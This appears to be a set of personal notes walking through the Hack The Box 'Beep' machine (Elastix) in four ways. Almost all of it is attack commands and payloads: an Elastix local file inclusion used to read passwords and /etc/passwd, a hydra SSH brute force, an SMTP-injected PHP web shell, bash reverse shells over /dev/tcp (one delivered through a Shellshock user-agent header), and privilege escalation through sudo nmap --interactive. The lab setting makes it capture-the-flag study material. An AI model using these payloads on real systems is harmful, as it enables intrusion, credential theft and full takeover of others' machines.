nmap -sC -sV -oA nmap 10.10.10.7
run dirbuster 


solution method 1:
go to https://10.10.10.7
=>you will get a login page
=>now on login page there is an logo named elastix
=>curl -k https://logourl.png -o elastix.png
=>exiftool elastix.png[no meta data intersting to see]
=>searchsplot elastix [we found some exploits and lets use lfi]
=>lfi echos password now lets check for ssh username by using lfi /etc/passwd now the username which contains bin/bash will contain the ssh
=>lets use hydra by collecting password and username 
=>hydra -L user.txt -P password.txt ssh://10.10.10.7
=>now we got root access with useranme root and passwd from password.txt


solution method 2:
SMTP

=>telnet 10.10.10.7 25
=>EHLO something[ippsec.beep.htp]
=>VRFY username
=>mail from:pwned@haha.io
=>rcpt to username
>data 
=>subject:you got owned
<?php echo system($Request['ipp']); ?>
exit telnet
go to repeater and lfi /var/mail/username and action&ipp=whoami u can see code execution
convert it into post request so that no url encoding 
ipp = bash -i >& /dev/tcp/$ip/$port 0>&1[ctrl+u for url encoding on repeater ]
nc -nlvp $port
now we get shell 
sudo -l [ to chek what i can run from searchsplit there is an another expoit for rc where we nmap]
sudo nmap --interactive
then from nmap menu we use !sh to get


solution method 3:

searchsploit elastix 
searchsploit -p 18650.py
copy the path modify the path and change lhost[my pc] rhost[10.10.10.7]
if certificate problem arise 
fireup the burp add 127.0.0.1 80
now at lhsot change it localhost
same nmap --interactive
solution method 4:
just reload the page
got to useragent: () { :; }; bash -i >& /dev/tcp/ip/port 0>&1
